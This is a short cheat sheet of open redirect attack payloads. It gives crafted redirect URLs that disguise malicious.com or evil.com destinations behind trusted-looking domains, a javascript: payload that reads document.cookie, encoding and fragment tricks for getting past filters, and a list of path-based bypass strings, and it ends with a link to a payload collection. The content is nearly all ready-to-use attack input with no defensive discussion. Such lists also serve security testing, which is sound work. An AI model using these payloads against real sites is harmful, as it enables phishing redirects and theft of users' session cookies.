# Open Redirect Payload

### Basic redirect to malicious site:

```
http://example.com/redirect?url=http://malicious.com
```

### Using userinfo to disguise the real domain (bypass naive checks):

```
http://example.com/redirect?url=http://trusted.com@malicious.com
```

### Using subdomain tricks to impersonate trusted domains:

```
http://example.com/redirect?url=http://trusted.com.evil.com
```

### Using port numbers and encoded characters:

```
http://example.com/redirect?url=http%3A%2F%2Fmalicious.com%3A80
```

### Using JavaScript pseudo-protocol for XSS via redirect:

```
http://example.com/redirect?url=javascript:alert(document.cookie)
```

### Using double encoding or encoded newlines:

```
http://example.com/redirect?url=http%3A%2F%2Fevil.com%250Aalert(1)
```

### Bypassing filters by adding fragments:

```
http://example.com/redirect?url=http://trusted.com#@malicious.com
```

### Chaining redirects with nested redirect parameters:

```
http://example.com/redirect?url=http://trusted.com/redirect?url=malicious.com
```

---

## Open Redirect Payloads

```
/%09/example.com
/%2f%2fexample.com
/%2f%2f%2fbing.com%2f%3fwww.omise.co
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cexample.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.example.com
//%09/example.com
//%5cexample.com
///%09/example.com
///%5cexample.com
////%09/example.com
/////example.com
/////example.com/
////\;@example.com
////example.com/
////example.com/%2e%2e
////example.com/%2e%2e%2f
```

## Github Repo
https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt